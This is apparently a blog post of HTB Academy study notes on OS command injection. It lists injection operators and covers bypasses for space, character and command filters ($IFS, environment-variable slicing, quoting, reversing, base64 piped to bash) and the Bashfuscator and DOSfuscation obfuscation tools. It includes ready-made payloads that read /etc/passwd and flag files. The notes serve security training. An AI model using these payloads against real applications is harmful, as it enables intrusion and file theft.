---
title: "command injections"
date: 2026-02-23 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "OS command injection operators, space/character restriction bypasses ($IFS, base64), out-of-band exfiltration, and WAF evasion."
image:
  path: /assets/img/posts/command_injections.jpg
  alt: command injections
---

# **Command Injection Methods**

```jsx
%0abash<<<$(base64${IFS}-d<<<Y2F0IC9mbGFnLnR4dA==)

# do not forget to add injection operator like new line or %0a
```

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `||` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ```` | `%60%60` | Both **(Linux-only)** |
| Sub-Shell | `$()` | `%24%28%29` | Both **(Linux-only)** |

We can use any of these operators to inject another command so `both` or `either` of the commands get executed. `We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.`

In general, for basic command injection, all of these operators can be used for command injections `regardless of the web application language, framework, or back-end server`. So, if we are injecting in a `PHP` web application running on a `Linux` server, or a `.Net` web application running on a `Windows` back-end server, or a `NodeJS` web application running on a `macOS` back-end server, our injections should work regardless.

| **Injection Type** | **Operators** |
| --- | --- |
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00` |
| Object Injection | `;` `&` `|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

Keep in mind that this table is incomplete, and many other options and operators are possible. It also highly depends on the environment we are working with and testing.

# **Filter/WAF Detection**

Let us start by visiting the web application in the exercise at the end of this section. We see the same

![Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to '127.0.0.1+%3b+whoami'. The response displays a Host Checker form with '127.0.0.1' entered and an 'Invalid input' message.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_1.jpg)

This indicates that something we sent triggered a security mechanism in place that denied our request. This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the `PHP` web application itself. `If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

## bypassing space filters

### **Using Tabs**

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (`127.0.0.1%0a%09`) and see if our request is accepted:

### **Using $IFS**

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

### **Using Brace Expansion**

There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

Bypassing Space Filters

```bash
Fau5t@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

## **Bypassing Other Blacklisted Characters**

---

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

---

### **Linux**

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables` like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.

For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:

Bypassing Other Blacklisted Characters

```bash
Fau5t@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

Bypassing Other Blacklisted Characters

```bash
Fau5t@htb[/htb]$ echo ${PATH:0:1}

/
```

**Note:** When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

### **Windows**

The same concept works on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) :

Bypassing Other Blacklisted Characters

```bash
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:

Bypassing Other Blacklisted Characters

```powershell
PS C:\htb>$env:HOMEPATH[0]

\PS C:\htb>$env:PROGRAMFILES[10]
PS C:\htb>
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need. `Try to be creative and find different commands to produce similar characters.`

### **Character Shifting**

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

Bypassing Other Blacklisted Characters

```bash
Fau5t@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Fau5t@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

## **Bypassing Blacklisted Commands**

### **Linux & Windows**

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

Bypassing Blacklisted Commands

```bash
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

### **Linux Only**

We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, `the number of characters do not have to be even`, and we can insert just one of them if we want to:

Code: bash

```bash
who$@ami
w\ho\am\i
```

### **Windows Only**

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

Bypassing Blacklisted Commands

```bash
C:\htb> who^ami

21y4d
```

```jsx
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

# **Advanced Command Obfuscation**

---

In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

---

### **Case Manipulation**

One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:

Advanced Command Obfuscation

```bash
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

### **Reversed Commands**

Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:

Advanced Command Obfuscation

```bash
Fau5t@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

Advanced Command Obfuscation

```bash
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

The same can be applied in `Windows.` We can first reverse a string, as follows:

Advanced Command Obfuscation

```powershell
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

Advanced Command Obfuscation

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

### **Encoded Commands**

The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding). Let's take `base64` as an example. First, we'll encode the payload we want to execute (which includes filtered characters):

Advanced Command Obfuscation

```bash
Fau5t@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

Advanced Command Obfuscation

```bash
Fau5t@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:

Advanced Command Obfuscation

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

Advanced Command Obfuscation

```bash
Fau5t@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

Advanced Command Obfuscation

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

```jsx
127.0.0.1%0abash<<<$(fi'n'd${IFS}${PATH:0:1}usr${PATH:0:1}share${PATH:0:1}${IFS}<<<${IFS}g'r'ep${IFS}root${IFS}<<<${IFS}gr'e'p${IFS}mysql${IFS}<<<${IFS}t'a'il${IFS}-n${IFS}1)
```

# **Linux (Bashfuscator)**

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

Evasion Tools

```bash
Fau5t@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Fau5t@htb[/htb]$ cd Bashfuscator
Fau5t@htb[/htb]$ pip3 install setuptools==65
Fau5t@htb[/htb]$ python3 setup.py install --user
```

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

Evasion Tools

```bash
Fau5t@htb[/htb]$ cd ./bashfuscator/bin/
Fau5t@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

Evasion Tools

```bash
Fau5t@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:${*/+27\[X\(} ...SNIP...  ${*~}
[+] Payload size: 1664 characters
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:

Evasion Tools

```bash
Fau5t@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:

Evasion Tools

```bash
Fau5t@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

# **Windows (DOSfuscation)**

There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:

Evasion Tools

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:

Evasion Tools

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:

Evasion Tools

```bash
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

## prevention

input validation & sanitization

server configuration

```jsx
%0abash<<<$(base64${IFS}-d<<<Y2F0IC9mbGFnLnR4dA==)
```
